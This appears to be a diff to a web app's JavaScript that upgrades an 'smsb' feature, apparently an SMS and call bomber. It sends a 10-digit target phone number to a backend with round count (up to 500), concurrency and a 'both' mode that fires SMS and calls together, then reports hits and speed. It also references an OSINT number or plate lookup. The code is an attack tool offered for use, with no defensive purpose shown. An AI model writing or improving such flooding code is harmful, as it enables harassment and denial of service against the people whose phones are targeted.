@@ -667,22 +667,20 @@ class ApiService {
     return this.json(ENDPOINTS.vosint + '?number=' + encodeURIComponent(plate));
   }
 
-  static async smsb(number) {
-    try {
-      const res = await fetch(ENDPOINTS.smsb, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ number })
-      });
-      const txt = await res.text();
-      let ok = res.ok;
-      try {
-        const j = JSON.parse(txt);
-        if (j.status === false || j.success === false) ok = false;
-      } catch { /* ignore */ }
-      return ok;
-    } catch { return false; }
+  static async smsb(number, count = 1, delay = 0, concurrency = 10, mode = 'both') {
+  try {
+    const res = await fetch(ENDPOINTS.smsb, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ number, count, delay, concurrency, mode })
+    });
+    if (!res.ok) return { ok: false, status: res.status };
+    const data = await res.json();
+    return { ok: true, ...data };
+  } catch (e) {
+    return { ok: false, error: String(e.message || e) };
   }
+}
 
   static yuki(message, history) {
     return this.json(ENDPOINTS.yuki, {
@@ -1076,52 +1074,53 @@ class UIController {
     if (!fire || !stop || !qSmsb || !cntSmsb || !dlySmsb) return;
 
     fire.addEventListener('click', async () => {
-      if (this.smsbRunning) return;
-      const digits = qSmsb.value.replace(/\D/g, '');
-      if (digits.length < 10) {
-        this.setStatus('status-smsb', 'Target requires 10 digits', 'err');
-        this.audio.play('error');
-        return;
-      }
-      const count = clamp(parseInt(cntSmsb.value, 10) || 1, 1, 500);
-      const delay = clamp(parseFloat(dlySmsb.value) || 0, 0, 5);
+  if (this.smsbRunning) return;
+  const digits = qSmsb.value.replace(/\D/g, '');
+  if (digits.length < 10) {
+    this.setStatus('status-smsb', 'Target requires 10 digits', 'err');
+    this.audio.play('error');
+    return;
+  }
+  const count = clamp(parseInt(cntSmsb.value, 10) || 10, 1, 500);
+  const delay = clamp(parseFloat(dlySmsb.value) || 0, 0, 5);
+  const concurrency = 10;
+  const mode = 'both';
 
-      this.smsbRunning = true;
-      this.smsbStop = false;
-      this.smsbSent = 0;
-      this.smsbFailed = 0;
-      fire.disabled = true;
-      stop.disabled = false;
-      if (meter) meter.style.display = 'flex';
-      if (fill) fill.style.width = '0%';
-      if (stats) stats.textContent = `0 / ${count}`;
-      this.audio.play('tab');
+  this.smsbRunning = true;
+  this.smsbStop = false;
+  fire.disabled = true;
+  stop.disabled = false;
+  if (meter) meter.style.display = 'flex';
+  if (fill) fill.style.width = '0%';
+  if (stats) stats.textContent = `0 / ${count}`;
+  this.setStatus('status-smsb', `🚀 Dual fire · ${count} rounds (SMS + CALL)...`);
+  this.audio.play('tab');
 
-      for (let i = 1; i <= count; i++) {
-        if (this.smsbStop) {
-          this.setStatus('status-smsb', `Aborted · Sent=${this.smsbSent} Failed=${this.smsbFailed}`, 'err');
-          this.audio.play('error');
-          break;
-        }
-        const ok = await ApiService.smsb(digits);
-        if (ok) { this.smsbSent++; this.audio.play('packet'); }
-        else { this.smsbFailed++; }
+  try {
+    const result = await ApiService.smsb(digits, count, delay, concurrency, mode);
 
-        const pct = Math.round((i / count) * 100);
-        if (fill) fill.style.width = pct + '%';
-        if (stats) stats.textContent = `${i} / ${count} (${pct}%)`;
-        this.setStatus('status-smsb', `Dispatched [${i}/${count}] · OK: ${this.smsbSent} | FAIL: ${this.smsbFailed}`);
-        if (delay) await sleep(delay * 1000);
-      }
-
-      if (!this.smsbStop) {
-        this.setStatus('status-smsb', `Completed · OK: ${this.smsbSent} | FAIL: ${this.smsbFailed}`, this.smsbSent > 0 ? 'ok' : 'err');
-        this.audio.play(this.smsbSent > 0 ? 'success' : 'error');
-      }
-      this.smsbRunning = false;
-      fire.disabled = false;
-      stop.disabled = true;
-    });
+    if (result.ok) {
+      if (fill) fill.style.width = '100%';
+      if (stats) stats.textContent = `${count} / ${count} (100%)`;
+      this.setStatus('status-smsb',
+        `✅ Done · SMS: ${result.sms.sent}/${result.sms.sent + result.sms.failed} · ` +
+        `CALL: ${result.call.sent}/${result.call.sent + result.call.failed} · ` +
+        `Speed: ${result.speed}`,
+        result.total_hits > 0 ? 'ok' : 'err');
+      this.audio.play(result.total_hits > 0 ? 'success' : 'error');
+    } else {
+      this.setStatus('status-smsb', `❌ Failed: ${result.error || result.status}`, 'err');
+      this.audio.play('error');
+    }
+  } catch (e) {
+    this.setStatus('status-smsb', '❌ ' + e.message, 'err');
+    this.audio.play('error');
+  } finally {
+    this.smsbRunning = false;
+    fire.disabled = false;
+    stop.disabled = true;
+  }
+});
 
     stop.addEventListener('click', () => {
       if (!this.smsbRunning) return;
@@ -1216,7 +1215,8 @@ push('me', msg);
   window.addEventListener('load', () => setTimeout(() => audio.play('boot'), 400));
 })();
 </script>
-  <script type="module">
+<!-- Firebase SDKs -->
+<script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
 
